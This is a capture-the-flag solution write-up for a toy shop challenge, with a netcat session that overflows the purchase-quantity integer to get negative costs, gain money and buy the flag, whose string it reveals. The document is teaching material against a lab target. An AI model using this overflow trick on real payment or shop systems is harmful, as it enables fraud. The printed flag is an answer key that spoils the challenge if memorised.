# Solution
This challenge is a simple IOF(Integer overflow) challenge. you dont really need to be too precise for this challenge.

The idea is to
1. IOF the fake flags to make the cost negative to add to your money
2. Buy the real flag using the money obtained in part 1

*it is also technically possible to do that with just the real flag, which is faster! Do what floats your boat :wink:*

```
$ nc localhost 8080
Welcome to my shop, what would you like to buy?
+---------------------------------------------+
| 1) Fake flag -    20g                       |
| 2) Real flag - 99999g                       |
| q) Exit Shop -     0g (That'll be cruel...) |
+---------------------------------------------+
Money: 100
1
How many do you want?
4380178787
Oops, you have not enough money!
You need 1704229820g!
+---------------------------------------------+
| 1) Fake flag -    20g                       |
| 2) Real flag - 99999g                       |
| q) Exit Shop -     0g (That'll be cruel...) |
+---------------------------------------------+
Money: 100
1
How many do you want?
843917395791
Purchased!
Thanks for shopping!
+---------------------------------------------+
| 1) Fake flag -    20g                       |
| 2) Real flag - 99999g                       |
| q) Exit Shop -     0g (That'll be cruel...) |
+---------------------------------------------+
Money: 873557560
2
How many do you want?
1
Purchased!
Heres your flag: CTF101{I0Fs_c4n_bE_Sn3Ak3y_47}

+---------------------------------------------+
| 1) Fake flag -    20g                       |
| 2) Real flag - 99999g                       |
| q) Exit Shop -     0g (That'll be cruel...) |
+---------------------------------------------+
Money: 873457561
^C
```
